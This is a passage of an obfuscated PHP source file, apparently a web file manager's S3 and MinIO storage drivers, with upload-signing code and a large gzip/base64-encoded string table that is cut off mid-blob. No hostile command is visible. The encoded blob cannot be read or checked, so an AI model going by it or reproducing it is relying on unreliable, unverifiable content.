&& $this->objectMeta($ıãßıÒà); } public function isFolder($ƒ…®ªï) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][179], $ƒ…®ªï); } protected function objectMeta($„ÔÎò›Ş) { return $this->cacheMethod($_SERVER[Ş­ğŠìÒ][181], $„ÔÎò›Ş); } protected function _objectMeta($úàô†î) { $Ã—‹Ú›» =& $_SERVER[Ş­ğŠìÒ]; $úàô†î = rtrim($úàô†î, $Ã—‹Ú›»[8]); try { $½¿Î¹çı = $this->client->getObjectInfo($this->bucket, $úàô†î); if (!isset($½¿Î¹çı[$Ã—‹Ú›»[252]]) && isset($½¿Î¹çı[$Ã—‹Ú›»[268]])) { $½¿Î¹çı[$Ã—‹Ú›»[252]] = $½¿Î¹çı[$Ã—‹Ú›»[268]]; } } catch (Exception $¯­•¼ûî) { $½¿Î¹çı = !1; } if (!$½¿Î¹çı) { } return $½¿Î¹çı; } protected function _isFolder($ŸİË¢úâ) { $İ°ÙÄ¢ =& $_SERVER[Ş­ğŠìÒ]; $ŸİË¢úâ = rtrim($ŸİË¢úâ, $İ°ÙÄ¢[8]); if ($ŸİË¢úâ == $İ°ÙÄ¢[12] || $ŸİË¢úâ == $İ°ÙÄ¢[8]) { return !0; } $¾ Û§ÖÓ = $this->client->getBucket($this->bucket, $ŸİË¢úâ, null, 1); if (empty($¾ Û§ÖÓ[$İ°ÙÄ¢[236]])) { return !1; } $¯ë¬¦Ä« = $¾ Û§ÖÓ[$İ°ÙÄ¢[236]][0][$İ°ÙÄ¢[32]]; return stripos($¯ë¬¦Ä«, $ŸİË¢úâ . $İ°ÙÄ¢[8]) === 0 ? !0 : !1; if (substr($¯ë¬¦Ä«, -1) == $İ°ÙÄ¢[8]) { return !0; } if (get_path_this($¯ë¬¦Ä«) == get_path_this($ŸİË¢úâ)) { return !1; } return !0; } public function listObject($ˆî¯™) { return $this->fileList($ˆî¯™, $_SERVER[Ş­ğŠìÒ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($—£Ùƒø) { $”ÜÊŸìğ =& $_SERVER[Ş­ğŠìÒ]; parent::__construct($—£Ùƒø); $this->setSignVersion($”ÜÊŸìğ[247]); if (!$this->region) { $this->region = $”ÜÊŸìğ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $Ø¸Šß— = $this->getBucketRgn(); return $this->region == $Ø¸Šß— ? !0 : !1; } public function uploadFormData($Â¦è½‡Ô, $¨ çôÜá = 3600) { $ÖÚÚ«Šá =& $_SERVER[Ş­ğŠìÒ]; $”Ê—óû = $ÖÚÚ«Šá[229]; $ğ€¬Ó«¢ = $ÖÚÚ«Šá[270]; $âšãº¶Ÿ = $ÖÚÚ«Šá[62]; $×Åñè¼§ = gmdate($ÖÚÚ«Šá[271]); $ã¥•Óî = gmdate($ÖÚÚ«Šá[272]); $‘ÕÀĞ« = $ÖÚÚ«Šá[273]; $ñìÔÇÓ = $¨ çôÜá . $ÖÚÚ«Šá[12]; $Ñ©¡Ù«‚ = $ÖÚÚ«Šá[274]; $®¸‘Îá = array($this->accessKey, $ã¥•Óî, $this->region, $âšãº¶Ÿ, $‘ÕÀĞ«); $®Ñ¡ÕÓè = implode($ÖÚÚ«Šá[8], $®¸‘Îá); $°Ä¾Á¢¿ = array($ÖÚÚ«Šá[275] => gmdate($ÖÚÚ«Šá[276], strtotime($ÖÚÚ«Šá[277])), $ÖÚÚ«Šá[278] => array(array($ÖÚÚ«Šá[279] => $this->bucket), array($ÖÚÚ«Šá[280] => $”Ê—óû), array($ÖÚÚ«Šá[281], $ÖÚÚ«Šá[282], $ÖÚÚ«Šá[12]), array($ÖÚÚ«Šá[281], $ÖÚÚ«Šá[283], $ÖÚÚ«Šá[12]), array($ÖÚÚ«Šá[281], $ÖÚÚ«Šá[284], $ÖÚÚ«Šá[12]), array($ÖÚÚ«Šá[285] => $Ñ©¡Ù«‚), array($ÖÚÚ«Šá[286] => $®Ñ¡ÕÓè), array($ÖÚÚ«Šá[287] => $ğ€¬Ó«¢), array($ÖÚÚ«Šá[288] => $×Åñè¼§), array($ÖÚÚ«Šá[289] => $ñìÔÇÓ))); $†ÁŠ‘»¢ = base64_encode(json_encode($°Ä¾Á¢¿)); $ªÄü“¢« = hash_hmac($ÖÚÚ«Šá[290], $ã¥•Óî, $ÖÚÚ«Šá[291] . $this->secret, !0); $Ş®°ÄÁÀ = hash_hmac($ÖÚÚ«Šá[290], $this->region, $ªÄü“¢«, !0); $ê•±Òäè = hash_hmac($ÖÚÚ«Šá[290], $âšãº¶Ÿ, $Ş®°ÄÁÀ, !0); $…ßœº× = hash_hmac($ÖÚÚ«Šá[290], $‘ÕÀĞ«, $ê•±Òäè, !0); $¡¦¡«ó– = hash_hmac($ÖÚÚ«Šá[290], $†ÁŠ‘»¢, $…ßœº×); $áóÅ¿Î„ = array($ÖÚÚ«Šá[246] => $ÖÚÚ«Šá[12], $ÖÚÚ«Šá[292] => $ÖÚÚ«Šá[12], $ÖÚÚ«Šá[280] => $”Ê—óû, $ÖÚÚ«Šá[285] => $Ñ©¡Ù«‚, $ÖÚÚ«Šá[293] => $†ÁŠ‘»¢, $ÖÚÚ«Šá[294] => $®Ñ¡ÕÓè, $ÖÚÚ«Šá[295] => $ğ€¬Ó«¢, $ÖÚÚ«Šá[296] => $×Åñè¼§, $ÖÚÚ«Šá[297] => $ñìÔÇÓ, $ÖÚÚ«Šá[298] => $¡¦¡«ó–, $ÖÚÚ«Šá[208] => $this->getHost()); return $áóÅ¿Î„; } } goto eº´ìà›Õï; eÚƒ›Ú›¬«: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\336\255\360\212\354\322", strrev('ôÚëı€‰')); $_SERVER[Ş­ğŠìÒ] = explode("\174\2\174\2\174\6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\133\305\265\60\245\264\217\260\225\255\120\312\166\143\222\330\116\264\70\316\356\304\111\144\133\266\105\144\313\221\344\54\330\346\346\112\272\266"."\x6f\x2c\xe9\xca\xba\x57\x5e\x12\x87\xb2\x94\x7d\xdf\xb7\x50\xa0\x40\xcb\x9a\x84\x86\x25\x10\x2\x14\x4a\x81\xb2\xb7\x40\x81\x96\xd2\x42\x6c\x87\x25\x40\xa1\xf0\xa0\xaf\x85\x7f\x96\x33\xcb\xbd\x92\xa1\xff\xf7"."\xfe\xef\xfb\x3\x89\x66\xce\x9c\x99\x3b\xcb\x99\x33\x67\xce\x9c\x39\xb3\x79\xfc\xd4\xf7\x4f\xdb\x36\xb2\x27\xfa\xef\xfb\x97\xfd\xcf\x93\x5b\x7f\xfd\xa\xd\x8f\xec\x85\xfe\xfd\xe\xd\x1f\x7b\xee\xde\x7b\x90"."\77\207\234\173\116\105\105\363\334\175\146\264\356\167\341\75\167\151\267\151\267\153\347\105\302\317\74\33\332\377\371\73\217\17\216\335\364\314\360\330\167\366\30\376\375\73\177\251\101\310\64\157"."\15\375\121\262\246\255\350\103\206\145\133\24\220\64\263\335\106\17\15\33\131\372\353\247\77\355\321\160\136\317\230\266\116\243\76\372\243\102\275\310\277\126\177\332\140\351\152\153\44\256\306\332".base64_decode('29qC0Tgg1cjpGTMFoZyW1zLw/Zyet1Bt5OLUnJnTsw6IAKQ0W0toFpTUUKc2BNvCkdVqfA==')."\165\133\20\60\22\152\177\101\317\17\323\30\11\306\154\55\157\307\215\214\316\61\6\363\274\136\165\301\246\120\253\22\217\6\132\143\201\372\170\50\322\112\301\365\221\226\226\120\274\30\36\215"."\204\303\165\201\372\145\305\51\155\321\100\123\113\100\101\365\113\353\252\221\355\66\53\224\65\64\145\215\122\111\3\215\206\236\116\321\140\126\143\325\261\207\163\20\212\363\20\32\246\154\41\235".base64_decode('ppFWHkrp3VohDb3VIEdyeSOjsUYv04c5lAa0gm0a2SSNBIfsvCbgqK5JNNB6FoqKBcPB+g==').base64_decode('uIIrqDRGIy0KDEJGs2w9r6xsDkaDCq50bTlpa7kC9NKKukIJhMPKRCXYeibHiqF5ShQWiQ==')."\66\4\243\112\335\152\105\364\120\322\314\144\314\254\17\225\202\106\322\226\252\32\214\106\151\300\3\344\35\16\341\101\203\110\244\261\61\26\344\61\150\334\362\60\252\311\54\240\117\107\54\325"."\x9d\xb6\xd5\x1\x2d\x5d\x60\x64\xda\x47\x7f\xcb\xe1\x7\x7e\x4d\xb\x48\xb7\xdf\xc8\x1a\x5\x20\x53\x28\xc2\x34\xf9\xb4\x82\x40\x81\x61\xeb\xc\xa2\xa7\x20\x90\x41\xf9\x4d\xc8\x97\x0\x58\x82\x61\xad\x65\x1"."\3\315\320\1\32\254\135\114\177\27\102\376\204\212\323\364\274\255\352\331\244\231\62\262\60\217\227\0\75\152\166\157\103\336\100\10\64\336\155\246\123\54\154\31\353\240\225\335\106\132\157\55"."\x64\x64\x14\x1e\x4d\xf6\x1a\xe9\x54\x9e\x4d\xbd\x6f\xc2\xa4\xd1\x30\x9f\xc9\x18\x57\xc4\x72\xa8\x26\x23\x8c\x9\x18\xdd\xc3\x62\x2a\x62\xbc\x36\x9e\x6a\x99\x85\x7c\x52\xf\xa1\xa9\x43\xe3\x33\x1\xac\xdb\x36"."\152\34\353\20\263\75\227\66\265\124\114\317\363\246\31\146\43\52\50\122\260\145\140\201\240\65\232\371\114\3\142\32\360\175\64\141\214\366\22\11\175\154\312\244\244\36\363\127\164\234\342\375".strrev('|‡Ò›9T$¨æ¤¶õf¯j"†#õ‘„­øgX±ÍI•9‡H}U§OW©Ô\'b¸§ú)c«ª')."\271\336\34\215\212\331\336\351\240\171\334\165\255\246\35\224\130\166\332\114\152\151\271\211\64\334\153\333\271\230\236\115\341\236\200\246\230\203\131\322\123\71\135\7\244\6\217\222\122\132\224\325"."\112\163\215\121\143\261\214\231\64\17\261\326\161\230\305\201\366\20\33\316\124\67\120\53\133\61\312\340\203\206\105\230\237\230\271\132\56\227\66\222\232\155\230\131\277\231\264\165\333\153\331\171"."\135\203\22\3\311\244\156\131\336\172\63\153\347\315\264\67\220\116\233\203\336\110\336\350\61\262\65\312\164\212\203\23\321\174\367\142\336\130\3\223\270\154\241\202\11\7\177\146\172\155\301\356"."\366\316\147\223\223\143\347\265\254\325\255\347\275\101\230\31\65\12\252\54\147\220\14\255\301\260\162\246\145\340\352\325\50\232\155\153\311\136\314\134\104\361\265\337\200\157\144\323\106\126\57\306"."\x45\x85\xe8\xde\xb6\xbc\xd6\x93\xd1\x6a\x94\x5c\x21\x81\x3a\x0\x26\x24\xc0\x92\x18\x43\x46\x86\xe\xa8\x51\x32\xda\x90\x57\xeb\x61\x25\x5\x87\x72\x46\x5e\xb7\x58\xab\x95\xa6\x96\x38\x50\x54\xb7\xb7\x5\x4f"."\x24\x43\x4f\x79\x63\x88\x7b\x43\x61\xb3\xaa\x66\x2b\x88\x56\x14\x96\x46\xa1\xcd\xf1\x78\x9b\x1a\x6a\x44\xcb\x73\x6b\x50\x6d\x9\xc4\xeb\x9b\xa1\x74\x5b\xeb\x61\x45\x87\x11\x4f\xe6\x45\x32\xe0\x2a\x2f\x9a\x50"."\230\232\132\121\343\4\260\315\34\324\363\350\303\165\303\65\112\237\231\112\230\103\76\226\204\221\143\210\263\60\144\74\276\71\333\33\325\262\75\270\31\211\141\133\7\232\23\274\251\16\55\346"."\276\156\72\173\175\11\275\333\314\103\153\254\201\36\147\347\207\365\154\217\335\313\312\216\5\243\53\202\121\65\26\151\214\257\14\104\141\355\317\42\312\31\142\265\301\137\117\173\243\172\12\165".base64_decode('YtJm+bSc6P1VXjxh8MdZKp5ELC0casJ91+C1EJJXxmJlh42MgZtn8xTS2UgwaIIK+Umbaw==')."\x3b\xad\xe9\x15\x9d\xa9\x19\x95\x5e\xf4\xef\xf4\xca\x8e\xce\x6\xdf\xf4\xae\x25\x7e\x43\xe4\xf1\xcf\xf4\xcd\x54\xaa\xab\xe6\x2a\x6d\x48\x52\x31\xb4\xb4\x2\x8d\x2e\xc2\xa8\x52\x22\xcb\x9c\xdd\x22\x28\x3c\x6b"."\146\365\222\23\13\21\222\151\351\336\146\135\103\114\32\15\204\143\134\74\354\133\64\376\15\275\213\327\112\211\227\270\306\205\2\243\301\345\355\301\130\134\155\11\306\233\43\15\120\375\140\0"."\102\131\224\231\324\227\215\61\26\314\150\20\365\61\4\206\244\65\104\254\5\111\271\103\110\276\126\163\160\4\270\277\213\200\352\173\365\144\337\4\151\50\4\255\61\51\137\142\103\327\101\177"."\272\200\232\273\350\217\152\130\215\322\272\211\243\234\277\252\146\142\55\242\254\26\235\55\42\360\245\120\6\315\141\121\163\325\271\310\261\146\265\10\112\107\123\146\245\221\342\253\40\212\66\353"."\106\117\57\124\324\300\305\45\315\264\231\327\322\230\367\63\301\265\307\0\66\234\113\27\20\335\373\161\301\361\336\102\46\1\53\25\352\243\36\335\26\62\245\65\214\4\57\340\274\110\4\107".strrev('P$-›€[pkÓëE»DÒ_tÜ^‚ë„†Z†'."\0".'0ªsÕ©eœ©í—/§jÓ~bua‚')."\x16\x91\x18\xe6\x42\xbc\xc6\xd5\xba\xf9\x2\x1e\x9e\xb4\x2f\x83\xa\x21\x65\xd6\x9b\x7c\x55\xa6\xdb\x17\x10\x82\xd8\x1a\xa7\xe8\xf9\xbc\x99\x9f\xc\x18\x24\xac\x90\x85\x12\xf\x17\x14\x6e\x73\xb1\xc3\x42\x2c"."\x80\x85\x7b\x4d\x2e\xa6\x98\x8c\x18\x6b\xfc\xd0\xee\xa9\xd5\x8d\xc0\x36\x52\x48\x5c\xf3\x59\x36\x1a\x4\xd4\x40\x2d\x95\x2a\x5\x46\xac\x6\xa\x18\x61\x74\x4a\x12\x46\x40\xe\xf0\xc7\x66\xa1\xff\xc5\xa2\x9f"."\62\63\32\133\102\311\342\247\247\350\352\347\0\321\151\113\101\323\131\271\171\333\304\211\171\7\46\242\304\136\23\152\206\206\36\132\125\340\315\143\15\115\351\151\235\121\121\257\316\4\210\52"."\100\103\335\317\151\254\233\23\73\332\42\40\250\220\334\14\53\212\162\342\345\236\305\127\342\75\225\0\140\231\7\210\107\4\323\150\350\42\144\326\210\170\133\136\357\66\200\153\147\321\354\157"."\xd1\xf2\x7d\xac\x61\x28\xa7\x98\x6f\x38\x22\xcd\xc5\xc6\xf6\x70\x58\xad\x8f\xb4\xc6\xd1\x96\x8c\x42\x56\x46\x43\x71\xe0\x55\x51\xc4\x73\xd4\x40\x7d\x1b\xc4\x4\x67\xe3\x62\x99\x2c\x58\x50\xc8\x40\x35\xd0\x9"."\252\204\137\110\100\150\11\316\231\131\304\77\201\5\171\305\206\255\50\51\45\4\4\40\20\41\124\270\344\4\264\322\147\326\171\63\210\171\170\171\235\234\342\231\2\313\75\225\362\102\60\114".base64_decode('KT44uPPQRGZyYVskBhmWYCiSzRN8vrW1Q1JGIpGmIAD3Aarq1UDiDqyMsSW8gPDzxjpNNA==')."\151\11\253\17\153\110\46\55\104\175\147\253\274\142\344\13\226\127\307\122\206\370\302\154\157\163\113\240\336\33\153\16\124\317\231\113\241\253\63\251\316\170\263\141\165\236\300\343\320\215\203\326".base64_decode('bDWvI4bDPlRdBSXpWEqSqrfam/HiUnAP+qqqqlhZM+YqvYjPjbDVJEVGie27Csk+NmG0JA==')."\23\175\361\52\143\171\7\15\306\231\247\360\135\302\224\142\352\231\342\134\17\241\210\2\131\211\125\55\211\77\246\242\22\355\202\45\367\24\232\126\51\224\311\140\22\75\205\152\351\36\324\351"."\x76\x6f\x46\x6\x8a\x81\xa7\x71\x9d\x8a\x87\x7c\xec\x78\x2f\xe2\xbe\x75\xd2\xb8\x5c\xa5\x9c\x89\x4\x52\x68\xc6\xaa\x92\x75\x58\x55\xaa\xe\xab\x5c\x75\x58\x55\x5c\x7\xa\xb2\x8c\x9e\x2c\x6a\x25\x5b\xdc\x60"."\70\232\360\160\110\303\352\30\346\41\25\145\124\141\16\251\162\123\240\223\240\31\162\112\63\347\146\254\221\55\15\163\130\75\2\55\47\170\33\2\214\27\54\132\202\110\124\31\300\232\46\63"."\x5b\x5b\x3e\xd3\x57\x55\xae\xb0\x1d\x73\x6d\x79\x7b\xbc\x11\xed\x1f\x96\x2c\xde\x67\x51\xbd\x99\xc9\x61\xc6\xd8\x82\x37\x89\x78\xa\xd1\x8d\xe2\x62\x98\x1e\x8b\xb0\x6c\xc6\x22\x6d\x7c\x86\xd1\x78\x30\xae\xc1"."\342\270\310\57\343\55\362\117\124\52\20\133\106\133\147\146\21\171\243\105\63\343\113\2\15\143\61\224\257\101\70\142\361\130\274\71\324\272\114\155\211\64\4\303\152\250\25\311\151\361\142\170"."\x7b\x9b\x68\xbc\xc\xaf\x8b\xc4\x9b\x1d\xd0\x76\x24\xa9\xad\x8\x84\x43\x6e\xf4\xe0\xaa\x50\x2c\x1e\x2b\x99\x84\x60\xed\x41\x57\x4a\x43\x9d\xda\x16\xd\x36\x86\x56\xf1\x68\x63\x28\x18\x6e\x88\xa9\xf5\x81\xfa"."\x66\x81\xd3\x1a\x68\x81\x8\x12\x89\xf4\x74\xca\xf2\x3b\xf1\x55\x24\x72\xc6\xb8\x3a\x4d\x85\x1\x83\x98\x43\x83\xa5\x32\xdd\x8c\x2a\x78\x31\xda\xbe\xe8\x40\xc0\xd0\x5c\xac\x90\x24\x2d\x51\xd9\xa4\x2f\x70\x1".base64_decode('ku3VM2yxRVsvGBG276igP5VKIKbYOSgDLauJYR4kzWBxJGzA9xUQf4tqoGKcOmmTUxoQ6A==')."\xb6\xb9\xc0\xe9\x8a\xa3\x45\x44\xa4\xa1\x11\x8\x10\xcd\x27\xa2\x4\x32\x22\xf0\x19\x3\x2d\x49\x79\x3b\xc0\xaa\xd3\x2d\xb4\x8e\x6a\xa4\x2d\x18\xd\x60\x9d\xa5\xba\x32\x1a\x69\x6d\x82\xc\x83\xbd\x3a\xab\x40"."\10\272\277\202\355\72\101\165\151\213\225\135\113\33\32\323\141\211\116\137\153\262\256\234\106\177\320\206\233\211\364\131\326\335\11\54\335\60\271\226\5\272\321\174\140\222\211\131\340\237\111\230"."\46\24\235\306\373\254\21\266\342\162\235\347\132\213\121\307\20\133\253\147\214\260\65\1\150\66\262\54\330\252\62\222\242\61\211\14\51\40\30\215\106\242\320\23\266\331\307\364\135\64\61\32"."\214\261\145\22\257\77\6\353\47\277\157\6\220\257\216\204\70\370\274\377\304\316\301\31\25\35\336\31\276\56\24\250\234\276\224\106\41\326\351\163\104\231\154\135\310\363\334\170\252\127\130\113".base64_decode('Kms6/Z3+iiU1HQHvOs27rsq7wNuFJPLKGQDoWl/tmb0BIyDEJcd1oZ/aziVTO73TTlqztA==')."\xa3\xb3\xab\xbc\x66\xc6\xe4\x4e\xdf\x71\x9d\x83\x5d\xd3\x2b\x97\xb0\xef\x24\xb\x79\x24\xf4\x33\xd6\x8f\xaa\x9a\x9a\x51\x81\xaa\x84\xb6\xa5\x1c\x25\x2b\x71\x34\x82\xc0\x12\xd6\x19\x39\x1\x5d\x3f\x77\x3\x83"."\243\61\324\173\104\216\16\157\347\214\256\45\122\76\11\344\376\26\132\222\220\0\323\313\361\2\336\23\160\313\170\126\74\341\201\76\12\331\244\130\337\361\204\110\150\174\177\327\223\25\373\50"."\x3b\xcf\x75\xa0\x3\x88\x48\xc5\x62\xb5\x7e\x2a\xfd\xdd\xc0\x6\xb2\x47\x87\xd9\x4e\xce\x3f\xf2\x40\x9d\x85\xac\xd1\xcf\x36\x34\x59\xbd\x1f\x2\xa6\xcd\x8\x3b\xa1\xdb\x83\x3a\x23\xf\x4\x77\xc4\x11\x71\xb0"."\5\24\45\111\261\264\264\370\22\145\25\247\121\116\114\106\116\305\173\273\101\36\103\353\61\214\323\44\300\266\222\132\116\217\111\55\124\325\170\240\56\34\124\31\153\1\26\314\342\204\35\326"."\xf1\x93\x12\xd4\x34\xc1\x4a\x19\x63\x90\x14\x51\x44\x31\x4\x53\xde\xea\x4f\x2b\x84\x23\xd0\x4d\x55\xd\x39\x34\xb2\xa\x39\xbc\x3f\x52\xd0\x88\xa3\xbe\x55\x90\x24\xa4\xd4\x2e\x56\x68\x97\x43\x3e\x55\x1e\x80".base64_decode('HN/3YE2mLiY9Zk1Qp5wYIQttSdimwF/R2Vno0FNdHYjwNW931/pZGyqZtsTfif6wSKDE8Q==')."\205\312\331\240\212\4\134\37\256\7\127\123\73\42\74\231\106\315\74\337\131\344\34\373\167\333\264\265\264\243\210\70\206\300\340\162\311\27\24\266\164\264\303\202\143\141\131\130\72\367\41\174"."\xb4\x95\x2b\x48\xb9\x44\x29\x1d\x3c\xe0\x1c\x31\xdd\xf6\x71\xc\x8f\x94\xa8\xa2\xb8\xe3\xc\xae\xb6\xc\x66\x89\x91\x45\xd3\xa9\x5e\x5a\xe3\xa8\xda\x3c\x46\xb6\xfd\x8e\xc3\x22\x4b\xd7\xf2\xc9\xde\xc6\x42\x3a"."\x6d\x73\x6d\x4b\xda\xe8\x83\x2f\xc0\x5c\x81\xb3\x2b\x2f\xfd\x51\x66\x94\xca\xda\x68\xe6\x99\xf2\x71\x3a\x54\xa3\x6c\x7a\x29\xc4\x50\x36\x6b\xa6\x12\x32\xa9\x89\xd5\xb5\x29\x80\xe4\x98\xb8\x52\xc1\xce\x59\x94"."\120\253\122\27\211\204\203\201\126\5\57\344\260\0\41\51\41\26\154\13\240\325\13\253\61\143\361\140\224\302\103\15\136\126\356\52\57\323\141\360\200\1\335\156\346\250\0\256\333\152\332\144"._kodDe('KLnC+59xtwUpO8ymbtdGqzdW7Hvr4j0zcu7YKbjeVhp5bbYUm6LOenD72Jd4hfwrV0OG7y0=')."\0\111\142\125\260\173\261\126\71\255\15\173\150\165\302\372\200\236\366\60\225\214\207\325\321\303\24\121\36\242\100\152\200\152\265\243\351\4\325\42\101\304\65\173\75\230\200\60\375\172\304\201"."\212\307\34\314\352\171\202\2\35\43\366\353\36\261\227\367\364\344\315\102\256\215\175\123\212\321\152\1\100\324\231\3\242\246\151\173\230\156\313\43\53\271\240\26\1\66\117\112\166\147\351\326"."\x90\xfe\x77\x57\x2\xe8\xb\x27\x15\xf7\xd2\xb7\xc\x56\xf1\x78\x38\xf5\x7b\xeb\x69\x89\xa0\xcc\xdc\xc0\x56\x39\x7\xe\xd1\xb3\x71\xb1\x13\x77\xb8\x8\xad\x10\x13\x15\x37\xa0\x51\x83\xa3\x3b\x5a\xac\x1c\xe6".strrev('€¬g"ÊH4ëP¤áÉêT	J}ñY˜[ì=kg>“\'h£øiçÜakuÈBf§;8ªuš').base64_decode('Sohp3a5mecg8KjUHSo8xp2s+JPtMmsT6mBE7H1/HHPn22QntIiwwkhNCBK0sZsMxtKg1pg==')."\x59\xa7\x54\xcb\xc9\xc0\x80\x3d\xce\x18\x9e\x5c\x3e\xc2\x90\xc9\x9\x75\x8c\x2b\xd\xc3\xc1\xc6\xb8\x72\x7c\x4\x71\x2f\xc3\x54\x69\x1e\x15\x23\x2b\xe4\x1f\x33\xab\x38\xca\x66\xdd\xa5\xd4\x92\x74\x11\xd7\xb2"."\51\12\131\203\70\375\232\332\62\366\221\62\107\166\101\46\316\112\170\130\324\361\65\61\342\162\47\140\162\40\315\27\253\23\3\105\304\142\130\0\311\117\263\140\363\205\125\256\20\322\31\114".base64_decode('DK1MlxK7EQBWL8d3cVTMKUYSCv4AFEBkFcxSvGJ2SFFnl7so0rWE4i5qM7LDRjZm4L25Gw==')."\x3a\xc2\x57\x61\x21\x4\xe0\xc9\x2d\x62\x94\x2a\x27\xa\xd3\x45\x4\xab\xbe\x68\xf9\x1e\x38\xfe\xf5\xa4\x8d\x6c\x9f\xb4\x40\xb\xcd\x26\xaa\x3d\xce\x2a\xd5\x1d\x4a\x72\xd5\x1c\xa\x92\x50\x44\xf\xc0\x7c\x6"."\x8a\xef\xd5\xf2\xa2\x33\x19\x17\xc2\xac\x80\xb7\xc1\xc2\x28\x22\x2a\xa1\x75\x6b\x3\x42\x40\x71\xe4\x91\x78\x89\x65\xf\xb3\xda\xcb\x41\x67\xa1\x34\xda\xe0\x21\xbf\xcd\xa8\xf2\xf2\x74\xe5\xc3\x83\xf9\x8\x43"."\xa2\x2c\x8\xf1\x82\x30\xea\x2b\xf4\x43\x1a\x12\x37\x3d\x58\x77\x8f\x7e\xe8\x32\xce\x2c\x1\x8\x12\xa3\xfb\x42\xa6\x1\xce\x2\x70\x78\x5\x62\x0\x40\x38\xb8\xc3\x2b\x18\x3\x1\x61\x42\x95\x74\x1\x9c\x1"."\x39\xc5\x1\x5a\x93\x0\x67\xef\x48\x5e\x4f\xa3\xd5\x2c\xef\xc3\x73\xa4\x9\xaf\x49\xac\x4f\x28\x7b\x93\x69\x2e\xa6\xa3\x76\x42\xf1\xa2\x84\x58\x51\x9a\x8c\x2d\x74\xa8\x98\xdd\x8b\xe5\x81\x1f\x80\xf1\x29\x26"."\372\127\314\247\36\121\41\334\235\152\161\75\60\5\227\216\67\346\115\56\334\362\225\335\215\124\117\166\217\334\240\303\265\32\113\375\341\220\40\212\100\122\36\267\54\341\202\272\242\130\276\160".base64_decode('TWvBA5lyjB7H5OkC5kN7ArDP8VRJ4pbgM+vpkRgseBtc42ybJtpo5n159GVRIYnHAYMgNg==')."\32\170\35\224\205\4\136\212\205\22\44\156\355\224\205\130\316\130\116\143\114\232\313\151\214\172\311\256\242\40\30\47\251\262\250\17\257\5\115\10\163\341\26\263\207\140\312\260\61\4\317\67"._kodDe('Lo2D+fOhNKoyeyO8qLmiQ7rmJNdSidCw2jpk8Ps+jGSGAI86XhWLvRUADFR0h5r3Iflkv3g=')._kodDe('LGTPNxTEfBtWBjtTHCPjJxTFNDcdVDb9wwn2hOQm77OPrjDidVB7JwDk9jhrprHqiwo+V/M=')."\20\146\177\61\66\371\112\55\127\264\360\340\200\60\304\243\105\341\17\373\350\354\307\7\217\21\166\310\57\207\213\121\145\245\142\351\202\142\342\360\335\31\53\215\36\110\247\205\271\224\73\76"."\x61\x16\x3a\xeb\xe5\x4c\x32\x64\xc2\x6c\x8d\x64\x33\xcb\x2c\xd\x4a\xc1\xf8\x36\x66\x62\xd1\xdc\x7d\x0\xee\xe4\xd4\x13\x8b\x2c\x6c\x6e\xba\x77\x1c\x7c\x18\x4b\xc7\xd1\xe2\x5c\xdf\x6b\x64\x75\xa6\x72\xe9\x36".strrev('Nš_)(ªD;jˆ¤e¸j¾(°Uª¸ï.€ğA±Ÿ©&œ"&C<yî.6Yÿõ–)Vò')."\xa\x41\xd3\x97\xf6\x7\x5e\xb1\x42\x11\x9f\x35\x1\xcd\xba\xf1\xb8\x6d\x9\xe1\x89\x43\x7c\xa1\x95\x33\xe1\x24\x3c\x96\x72\xa1\x42\x84\xfb\x6\x7c\x5e\xb8\x10\xe7\x64\x3c\x44\xbb\x38\x61\xa2\xba\xb2\x64\x5e".strrev('–—ÍµŠŞİş~±ÿ}¦Ãù>G›'."\r".'WÓğƒ'."\r".'ÿ1/èóyá¤Ï­î|^‹á£NoÇıng½Ê')."\115\75\247\245\353\252\267\47\57\377\371\320\262\117\136\32\232\371\347\353\246\256\334\370\346\352\347\237\77\347\346\367\176\162\336\175\147\177\332\164\316\241\205\123\36\354\175\351\307\336\27\367"."\xcc\x7c\xb0\xc7\xfe\x7\xcf\xe\x3c\xd2\x52\xd8\xd9\x91\x1a\x18\x7f\xad\xeb\xf7\xc7\xef\x15\x98\xf5\xe9\xd8\x73\xcf\x2e\x3c\xe9\xa3\x55\xb7\x5c\xff\xaf\xbf\x3e\xfd\x83\xeb\xff\xd5\x7b\xd6\xc7\x7b\xdc\xe0\xdb"."\xf8\xc5\x8b\x37\xbd\xfb\x9d\xd9\x33\x4f\x19\xe9\xa9\xfe\xe3\xa4\x8a\xb1\xea\x27\x3e\xbb\xf3\x86\x3d\xfe\xb8\xfb\x9f\x7\x5c\xbf\xfd\xa9\x63\x4f\x38\xfb\x81\x37\xde\xfe\xc9\x9f\x66\x9e\xd1\x75\xde\x93\x23\x8d".strrev('İóÿ)¬ß3¾ıãyo×7¸ã¸>Ë¡íü^R-ÎĞ÷_‡¡Åû¿ç7£ıÿÏÃ±îª9Ïg')."\107\175\367\371\337\177\370\324\216\343\366\276\260\372\266\262\346\353\56\217\376\340\47\47\65\255\377\111\313\45\137\346\136\274\375\343\320\346\27\236\214\56\270\346\345\216\226\305\157\31\367\334".base64_decode('t2x/b+sntc2//+VhG39x9zLvB0OT7mo96oMffvL+ab8eW3rh3497Nv2HTwtHrzum/NpN/w==')."\x35\x77\xe9\xe4\xeb\xe7\xfc\x75\xdd\x9f\x6f\x37\x16\xcf\xf6\x5c\xf8\xaa\xe7\xe6\x97\x6b\xb7\x4e\x2b\xbf\xda\xbb\x63\xcb\xf2\x8b\x9e\xbf\xed\x9e\x83\xae\xaa\x7f\xec\xb9\x9f\x9d\xf1\xcf\xbd\x3f\x3a\xfb\x8e\xdd".base64_decode('W1+v2tfqeL1luGB+uLz3/rrhBU/sW9my5vEvHtyzdvK9371x+TGBDZ2/PWPNS7WJ+yZ9eg==').base64_decode('Zuvpjz766S+u+lHXsZMOO7Lm4bYXyo6569wnf7HH5MP3074746fNB6/vD9995JPdXRHPMw==')."\277\117\214\74\260\54\363\233\77\356\165\300\325\27\177\161\324\33\217\326\375\373\201\31\247\364\275\166\305\37\216\15\334\366\346\105\223\237\334\235\10\37\167\172\345\51\133\106\353\214\13\